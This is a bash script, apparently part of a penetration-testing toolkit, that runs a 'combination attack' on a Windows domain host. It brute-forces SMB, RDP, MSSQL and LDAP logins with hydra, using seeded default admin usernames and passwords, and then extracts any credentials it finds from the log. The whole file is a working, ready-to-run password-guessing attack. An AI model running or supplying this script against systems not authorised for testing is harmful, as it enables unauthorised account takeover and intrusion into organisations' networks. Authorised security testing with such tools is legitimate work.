#!/bin/bash

# ═══════════════════════════════════════════════════════════════════
# COMBINATION: WINDOWS INFRASTRUCTURE
# Tests RDP, SMB, MSSQL, LDAP for Windows domain
# ═══════════════════════════════════════════════════════════════════

TARGET="192.168.1.100"  # <-- CHANGE THIS TO YOUR TARGET

# ═══════════════════════════════════════════════════════════════════

set -euo pipefail  # Enterprise error handling

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Source utilities
source "$PROJECT_ROOT/scripts/logger.sh" 2>/dev/null || true
source "$PROJECT_ROOT/scripts/vpn_check.sh" 2>/dev/null && require_vpn "false"

# Configuration
OUTPUT_DIR="$PROJECT_ROOT/results/combinations"
mkdir -p "$OUTPUT_DIR"

LOG_FILE="$OUTPUT_DIR/combo_windows_${TARGET//[.:\/]/_}_$(date +%Y%m%d_%H%M%S).log"

echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"
echo "  COMBINATION ATTACK: WINDOWS INFRASTRUCTURE" | tee -a "$LOG_FILE"
echo "  Target: $TARGET" | tee -a "$LOG_FILE"
echo "  Testing: RDP + SMB + MSSQL + LDAP" | tee -a "$LOG_FILE"
echo "  Scenario: Windows Domain Security Audit" | tee -a "$LOG_FILE"
echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

USERLIST="$PROJECT_ROOT/config/admin_usernames.txt"
PASSLIST="$PROJECT_ROOT/config/admin_passwords.txt"

[ ! -f "$USERLIST" ] && echo -e "administrator\nadmin\nuser" > "$USERLIST"
[ ! -f "$PASSLIST" ] && echo -e "Password123\nadmin\nP@ssw0rd" > "$PASSLIST"

# Phase 1: SMB
echo "━━━ Phase 1: SMB/CIFS (Port 445) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 4 -f smb://"$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
fi
echo "" | tee -a "$LOG_FILE"

# Phase 2: RDP
echo "━━━ Phase 2: RDP (Port 3389) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 2 -f rdp://"$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
fi
echo "" | tee -a "$LOG_FILE"

# Phase 3: MSSQL
echo "━━━ Phase 3: MSSQL (Port 1433) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    echo -e "sa\nadmin" > /tmp/mssql_users.txt
    hydra -L /tmp/mssql_users.txt -P "$PASSLIST" -t 4 -f mssql://"$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    rm -f /tmp/mssql_users.txt
fi
echo "" | tee -a "$LOG_FILE"

# Phase 4: LDAP
echo "━━━ Phase 4: LDAP (Port 389) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    echo -e "cn=administrator\ncn=admin" > /tmp/ldap_users.txt
    hydra -L /tmp/ldap_users.txt -P "$PASSLIST" -t 4 -f ldap://"$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    rm -f /tmp/ldap_users.txt
fi
echo "" | tee -a "$LOG_FILE"

# Summary
echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"
echo "  WINDOWS INFRASTRUCTURE ATTACK COMPLETE" | tee -a "$LOG_FILE"
echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"

if grep -q "login:" "$LOG_FILE"; then
    echo "" | tee -a "$LOG_FILE"
    echo "[+] DOMAIN CREDENTIALS FOUND:" | tee -a "$LOG_FILE"
    grep "login:" "$LOG_FILE" | tee -a "$LOG_FILE"
fi

exit 0
